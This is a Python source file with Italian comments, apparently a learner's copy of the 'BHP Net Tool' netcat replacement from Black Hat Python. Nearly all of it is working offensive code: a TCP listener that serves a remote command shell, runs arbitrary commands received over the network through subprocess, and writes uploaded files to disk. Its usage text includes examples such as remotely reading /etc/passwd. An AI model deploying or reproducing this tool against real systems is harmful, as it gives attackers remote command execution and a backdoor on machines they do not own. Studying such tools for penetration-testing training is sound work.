import argparse
import socket
import shlex
import sys
import subprocess
import textwrap
import threading

class NetCat:

    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run (self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send (self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:                   # se abbiamoun buffer lo inviamo
            self.socket.send(self.buffer)
        try:
            while True:                   # il While True ci serve per ricevere dati dall'utente, quando non ci sono più dati esce dal loop
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:             # se in response c'è qualcosa allora è vero: quindi stampiamo l'output e forniamo la shell interattiva
                    print(response)
                    buffer = input('> ') 
                    buffer += '\n'       # se il buffer fosse stato riempito in un modo diverso o manipolato, allora la presenza di \n assicura che la comunicazione funzioni correttamente.
                    self.socket.send(buffer.encode())

        except KeyboardInterrupt:        # usiamo un try/catch per òa terminazion manuale dell'utente
            print('Terminato dal utente!')
            self.socket.close()
            sys.exit

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        while True:
            client_socket, _= self.socket.accept()
            client_threand = threading.Thread(target=self.handle, args=(client_socket,))
            client_threand.start()

    def handle (self, client_socket):
        if self.args.execute:
            output = execute (self.args.execute)
            client_socket.send(output.encode())

        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open (self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'File salvato {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ') # invio una shell al client
                    while '\n' not in cmd_buffer.decode():   # finchè non si preme invio
                        cmd_buffer += client_socket.recv(64) # aggiungo i dati al buffer del cmd
                    response = execute(cmd_buffer.decode()) # dopo di che decodifico tutto e eseguo e salvo l'output in response
                    if response:
                        client_socket.send(response.encode()) # invio i dati da restituire al clinet
                    cmd_buffer = b''
                except Exception as e:
                    print (f'server killed {e}')
                    self.socket.close()
                    sys.exit()





def execute(cmd):
    cmd = cmd.strip()
    if not cmd: 
        return
    
    output = subprocess.check_output(shlex.split(cmd),
                                     stderr=subprocess.STDOUT)
    return output.decode()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='BHP Net Tool',
                                      formatter_class=argparse.RawDescriptionHelpFormatter,
                                      epilog=textwrap.dedent('''Esempio:
                         netcat.py -t 192.168.1.108 -p 5555 -l -c #command shell
                         netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #upload file
                         netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" #execute command
                         echo 'ABC'| ./netcat.py -t 192.168.1.108 -p 135 #echo text to server port 135
                         netcat.py -t 192.168.1.108 -p  5555 #conncet to server '''))
    parser.add_argument('-c', '--command', action='store_true', help='command_shell') # se hanno action='store_true significa che, se l'argomento è presente nella riga di comando, il valore associato a quell'argomento sarà impostato su True
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port',type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='127.0.0.1', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')

    args = parser.parse_args() # analizza gli argomenti passati. Include tutte le opzioni definite nel ArgumentParser

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()  # in caso non sia selezionata la modalità listen il buffer conterrà gli elemetnti da inviare

    nc = NetCat(args, buffer.encode()) # quindi all'oggetto netcat gli passeremo gli argomenti e il buffer
    nc.run()




